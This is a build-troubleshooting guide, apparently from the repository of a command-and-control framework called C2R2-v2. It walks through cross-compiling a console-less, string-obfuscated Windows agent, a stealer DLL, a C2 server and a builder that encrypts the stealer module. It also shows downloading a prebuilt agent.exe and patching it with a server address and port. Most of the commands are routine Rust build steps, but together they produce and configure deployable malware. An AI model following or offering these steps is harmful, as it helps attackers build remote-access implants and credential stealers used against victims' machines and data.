# Build Troubleshooting

This guide helps diagnose and fix build issues when compiling C2R2-v2 components.

---

## Prerequisites

Before building, ensure you have:

- [ ] Rust 1.70+ (`rustc --version`)
- [ ] MinGW-w64 (`x86_64-w64-mingw32-gcc --version`)
- [ ] Windows target (`rustup target list | grep windows`)

---

## Common Build Errors

### Error: "linker 'x86_64-w64-mingw32-gcc' not found"

**Cause:** MinGW-w64 not installed

**Solution:**
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install mingw-w64

# Arch Linux
sudo pacman -S mingw-w64-gcc

# macOS
brew install mingw-w64

# Verify
x86_64-w64-mingw32-gcc --version
```

---

### Error: "target 'x86_64-pc-windows-gnu' not found"

**Cause:** Windows cross-compilation target not installed

**Solution:**
```bash
rustup target add x86_64-pc-windows-gnu

# Verify
rustup target list | grep windows
# Should show: x86_64-pc-windows-gnu (installed)
```

---

### Error: "failed to run custom build command for winapi"

**Cause:** Outdated Rust or incompatible winapi version

**Solution:**
```bash
# Update Rust
rustup update

# Clean and rebuild
cargo clean
cargo build --release
```

---

### Error: "unresolved import `winapi::shared::ws2def::SOCKET`"

**Cause:** `SOCKET` type moved in newer winapi versions

**Solution:** This was fixed in recent code. If you see this:
1. Pull latest code
2. Or manually fix the import:
```rust
// Change from:
use winapi::shared::ws2def::SOCKET;

// To:
use winapi::um::winsock2::SOCKET;
```

---

### Error: "cannot find -lssl" or "-lcrypto"

**Cause:** OpenSSL development libraries not installed

**Solution:**
```bash
# Ubuntu/Debian
sudo apt install libssl-dev

# Fedora
sudo dnf install openssl-devel

# macOS
brew install openssl
```

---

### Error: DLL not found at runtime

**Cause:** Required DLLs not present on Windows target

**Solution:** Build with static linking or ensure these DLLs are present:
- `libgcc_s_seh-1.dll`
- `libwinpthread-1.dll`

For static linking, add to `.cargo/config.toml`:
```toml
[target.x86_64-pc-windows-gnu]
rustflags = ["-C", "target-feature=+crt-static"]
```

## Component-Specific Issues

### Agent Build

```bash
# Debug build (with console)
cargo build --target x86_64-pc-windows-gnu -p agent

# Release build (no console, optimized)
cargo build --release --target x86_64-pc-windows-gnu -p agent

# Production build (via builder)
cargo run -p builder -- build-agent --name agent --server IP:PORT --production
```

**Common Issues:**
- Missing `agent/src/config.rs` → Generated by builder
- `obfstr` errors → Update the crate: `cargo update -p obfstr`

---

### Stealer DLL Build

```bash
# Build DLL
cargo build --release --target x86_64-pc-windows-gnu -p stealer-dll

# Or use script
./build-stealer.sh
```

**Output location:**
```
target/x86_64-pc-windows-gnu/release/stealer.dll
```

**Common Issues:**
- "sqlite" errors → SQLite is bundled, should work. Try `cargo clean` first.
- Large binary size → Normal (~2MB), contains crypto libraries

---

### Server Build

```bash
# Build for Linux
cargo build --release -p c2r2-server
```

**Common Issues:**
- "tokio" errors → Ensure you're building for Linux (not cross-compiling)
- "rustyline" errors → Update Rust: `rustup update`

---

### Builder Build

```bash
# Build builder
cargo build --release -p builder
```

## Module Encryption Issues

### "stealer.dll not found"

**Cause:** DLL wasn't built before encryption

**Solution:**
```bash
# 1. Build DLL first
./build-stealer.sh
# or
cargo build --release --target x86_64-pc-windows-gnu -p stealer-dll

# 2. Then encrypt
cd builder
cargo run --release -- encrypt-module
```

---

### "Failed to write to modules directory"

**Cause:** Directory doesn't exist or wrong permissions

**Solution:**
```bash
mkdir -p c2r2-server/modules
chmod 755 c2r2-server/modules
```

## Docker Build Issues

### "Cannot connect to Docker daemon"

```bash
# Start Docker
sudo systemctl start docker

# Add user to docker group
sudo usermod -aG docker $USER
newgrp docker

# Verify
docker ps
```

---

### "Permission denied" on dist/

```bash
sudo chown -R $USER:$USER dist/
```

---

### Build takes too long

First build downloads and compiles all dependencies. Subsequent builds are faster.

Speed up with:
```bash
# Use more CPU cores
export CARGO_BUILD_JOBS=8

# Use faster linker (mold)
cargo install mold
export RUSTFLAGS="-C link-arg=-fuse-ld=mold"
```

## Cross-Compilation from ARM (Raspberry Pi)

### Problem: Can't cross-compile agent on ARM

The agent must be compiled on x86_64. On ARM devices (Raspberry Pi):

**Solution: Use `patch-agent` instead:**
```bash
# 1. Download pre-compiled agent from GitHub releases
wget https://github.com/G4sp4rCS/C2R2-v2/releases/latest/download/agent.exe

# 2. Patch with your server address
./builder patch-agent --input agent.exe --output my_agent.exe --server 192.168.1.10:4444
```

## Optimization Settings

### Smaller Binaries

In `Cargo.toml`:
```toml
[profile.release]
opt-level = "z"      # Optimize for size
lto = true           # Link-time optimization
codegen-units = 1    # Single codegen unit
strip = true         # Strip symbols
panic = "abort"      # No unwinding
```

### Faster Compilation

```bash
# Incremental compilation (default)
export CARGO_INCREMENTAL=1

# More compile jobs
export CARGO_BUILD_JOBS=8

# Use sccache
cargo install sccache
export RUSTC_WRAPPER=sccache
```

## Verifying Build Success

### Check binaries exist

```bash
# Server
file target/release/c2r2-server

# Agent
file target/x86_64-pc-windows-gnu/release/agent.exe

# Stealer DLL
file target/x86_64-pc-windows-gnu/release/stealer.dll

# Builder
file target/release/builder
```

### Check binary size

```bash
ls -lh target/x86_64-pc-windows-gnu/release/agent.exe
# Expected: ~500KB-600KB

ls -lh target/x86_64-pc-windows-gnu/release/stealer.dll
# Expected: ~2MB
```

## Clean Build

If experiencing persistent issues:

```bash
# Clean all build artifacts
cargo clean

# Remove Cargo cache (drastic)
rm -rf ~/.cargo/registry/cache
rm -rf ~/.cargo/git

# Rebuild everything
cargo build --release --workspace
```
